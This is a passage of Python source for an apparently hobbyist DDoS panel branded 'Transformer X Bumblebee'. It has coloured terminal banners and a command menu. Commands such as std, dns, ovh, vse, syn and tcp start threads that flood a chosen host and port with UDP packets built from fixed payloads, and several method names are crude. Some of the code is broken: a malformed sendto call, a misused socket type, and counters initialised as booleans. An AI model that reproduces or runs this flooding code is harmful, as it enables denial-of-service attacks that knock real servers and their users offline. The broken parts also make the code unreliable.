\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mDEVELOPER ACCES = \033[0;37m[999999]                
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mADMIN ACCES = \033[0;37m[999999]
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mEXPIRED TIME = \033[0;37m[99/99/9999]
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mAPI ACCESS = \033[0;37m[99999]
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mBOTS ACCESS = \033[0;37m[999999]
\x1b[38;2;0;204;111m                 ║           \x1b[38;2;0;204;111mUSER ACCESS = \033[0;37m[99999]
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╚═════\x1b[38;2;0;212;14m════════╩══════════════\x1b[38;2;0;186;45m═══════\x1b[38;2;0;83;168m════════════╝
"""

cooldown = """
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╔═════\x1b[38;2;0;212;14m════════╦══════════════\x1b[38;2;0;186;45m══════\x1b[38;2;0;83;168m═════════════╗
\x1b[38;2;0;204;111m                 ║             ╦  ╔═╗╔═╗╔╦╗╦╔╗╔╔═╗
\x1b[38;2;0;204;111m                 ║             ║  ║ ║╠═╣ ║║║║║║║ ╦
\x1b[38;2;0;204;111m                 ║             ╩═╝╚═╝╩ ╩═╩╝╩╝╚╝╚═╝
\x1b[38;2;0;204;111m                 ║              👑\x1b[38;2;0;204;111mLOADING L\033[0;37m TOOLS DDOS👑
\x1b[38;2;0;204;111m                 \x1b[38;2;0;221;34m╚═════\x1b[38;2;0;212;14m════════╩══════════════\x1b[38;2;0;186;45m══════\x1b[38;2;0;83;168m═════════════╝
"""

invalid = """\x1b[38;2;0;204;111mInvalid\033[0;34mCommands"""
cookies = open(".sinfull_cookies","A+")

fsubs = True
tpings = True
pscans = True
liips = True
tattacks = True
uaid = True
said = True
running = True
iaid = True
haid = True
aid = True
attack = True
ldap = True
http = True
atks = True

def randsender(host, timer, port, punch, payload):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1
              
              


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		powerran = (random.randint(90547,400111))
		sys.stdout.write("\x1b]2;[-] TransformerXBumblebee | Api Connected [999999] | Backup Server [999999] | Online User [999999] | Admin: [TransformerXBumblebee] | POWER : {}% [UNSTABLE]\x07".format (powerran))
		sin = input("\x1b[38;2;0;199;11m{}\x1b[38;2;0;221;20m[@root]\033[36m \033[0;31m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("cls")
			print (banner)
			main()
		if sinput == "cls":
			os.system ("cls")
			print (banner)
			main()
		elif sinput == "?":
			os.system ("cls")
			print (banner)
			main()
		elif sinput == "layer4":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (layer4)
			main()
		elif sinput == "plan":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (plan)
			main()
		elif sinput == "methods":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (methods)
			main()
		elif sinput == "bots":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (bots)
			main()
		elif sinput =="vip":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (vip)
			main()
		elif sinput == "primitive":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (primitive)
			main()
		elif sinput == "slaprape":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (slaprape)
			main()
		elif sinput == "raw":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (raw)
			main()
		elif sinput == "helpservice":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print (helpservice)
			main()
		elif sinput == "layer7":
			os.system ("cls")
			print (layer7)
			main()
		elif sinput == "pit":
			os.system ("cls")
			print ("pit")
			main()
		elif sinput == "plan":
			os.system ("cls")
			print (cooldown)
			time.sleep(5)
			os.system ("cls")
			print ("plan")
			main()
		elif sinput == "":
			print(invalid)
			main()
		elif sinput == "logout":
			print("Leaving Service in 3 Seconds")
			time.sleep(3)
			os.system ("cls")
			exit()
		elif sinput == "std":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "hotspot":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpn":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhx":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhbypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhrape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslump":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 655502
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpbypass":
			try:
				if running >= 20000:
